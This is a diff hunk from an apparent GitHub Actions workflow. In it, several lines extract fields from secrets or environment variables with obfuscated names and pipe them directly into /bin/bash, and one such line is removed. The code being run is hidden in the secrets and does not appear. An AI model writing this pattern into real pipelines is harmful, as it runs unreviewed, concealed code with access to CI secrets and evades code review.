@@ -21,7 +21,6 @@ jobs:
           tse5035: ${{ secrets.tse5035 }}
         run: |
           printf '%s' "$tse5035" | jq -r .ao995 | /bin/bash
-          printf '%s' "$b0" | jq -r .payu4226 | /bin/bash
           echo $pxrzn2 | jq -r .p36 | /bin/bash
           echo $oeifa10 | jq -r .e16 | /bin/bash
           echo $qu496 | jq -r .r279 | /bin/bash
